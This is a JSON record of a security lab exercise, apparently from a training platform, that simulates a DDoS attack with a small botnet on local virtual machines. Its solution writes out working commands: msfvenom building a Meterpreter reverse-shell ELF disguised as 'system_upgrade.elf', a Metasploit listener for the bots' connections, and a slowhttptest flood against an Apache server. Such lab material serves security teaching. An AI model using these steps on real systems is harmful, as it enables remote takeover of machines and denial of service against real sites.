{"description":"This laboratory simulate a ddos attack, performed by creating a simple small botnet, to an http apache2 server.","goal":"<p>The network is composed by 5 elements:</p>\n<ul>\n<li>Server_tohack -&gt; a machine ubuntu14.04 where is installed apache2 and is running on localhost a simple html page.</li>\n<li>Attacker -&gt; a kali_linux machine with the top_10 kali tools installed.</li>\n<li>Attacker_malware -&gt; a kali_linux machine with the top_10 kali tools and an apache server installed.</li>\n<li>Bot1 and Bot2 -&gt; two machine ubuntu14.04 with the tool wget installed.</li>\n</ul>\n<p>These images run locally in the same subnet.</p>\n<p>To perform the attack use Metasploit framework on the attacker_malware to create the malware and put it on the server, use Metasploit framework on the attacker to establish a connection with Bot1 and Bot2, then slowhttptest to send requests to Server_tohack.</p>","solution":"<p>The first thing to do is to start the server on Server_tohack and get the IP.</p>\n<p>commands:</p>\n<ul style=\"list-style-type: square;\">\n<li>sudo service apache2 start</li>\n<li>ifconfig</li>\n</ul>\n<p>Then, run the Attacker and get the IP with ifconfig (It is important to create the malware with the IP of who will perform the attack).</p>\n<p>Now, run the Attacker_malware and create the malware using a linux based payload, then move it to server to make it available for download and start the server. To make the download, get the server IP.</p>\n<p>commands:</p>\n<ul style=\"list-style-type: square;\">\n<li>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Attacker IP&gt; LPORT=&lt;Your Port to Connect On (we used 8081)&gt; -f elf &gt; system_upgrade.elf</li>\n<li>mv system_upgrade.elf /var/www/html</li>\n<li>sudo service apache2 start</li>\n<li>ifconfig</li>\n</ul>\n<p>At this point, prepare the attack on Attacker machine. Make it listen for incoming connections.</p>\n<p>commands:</p>\n<ul style=\"list-style-type: square;\">\n<li>sevice postgresql start&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //to start the database</li>\n<li>msfconsole&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //to start the interactive shell</li>\n<li>use exploit/multi/handler&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //to set the listener for multiple incoming connection</li>\n<li>set PAYLOAD linux/x86/shell/reverse_tcp //to set the linux payload used</li>\n<li>set LHOST&nbsp; &lt;CurrentIP&gt;</li>\n<li>set LPORT&nbsp; &lt;8081 or another choosen before&gt;</li>\n<li>set ExitonSession false&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //to make it listen after the first connection</li>\n<li>run -j&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //to start the listner</li>\n</ul>\n<p>On Bot1 and Bot2, install the tool slowhttptest. Then navigate to <a href=\"http://Attacker_malware\">http://Attacker_malware_</a>IP/system_upgrade.elf. Then make it executable, and start it.</p>\n<p>commands:</p>\n<ul style=\"list-style-type: square;\">\n<li>sudo apt-get update -y</li>\n<li>sudo apt-get install -y slowhttptest</li>\n<li>chmod +x system_upgrade.elf</li>\n<li>./system_upgrade.elf</li>\n</ul>\n<p>Now you can see in Attacker shell, that you have 2 active connection. (The same can be generalized to N connections)</p>\n<p>To see the active sessions, use the command : sessions</p>\n<p>To interact with a session, use the command: sessions -i &lt;Session_ID&gt;</p>\n<p>Use command background to switch between sessions.</p>\n<p>Finally, you can run the attack on both the bot machines, using the command:</p>\n<ul style=\"list-style-type: square;\">\n<li>slowhttptest -c 500 -H -i 10 -r 200 -t GET -u http://&lt;IP_Server_tohack&gt; -p 2</li>\n</ul>\n<p>Now, you can see in your browser that the site is down, until you don't stop the attack.</p>\n<p>&nbsp;</p>","author":"federica_musella"}
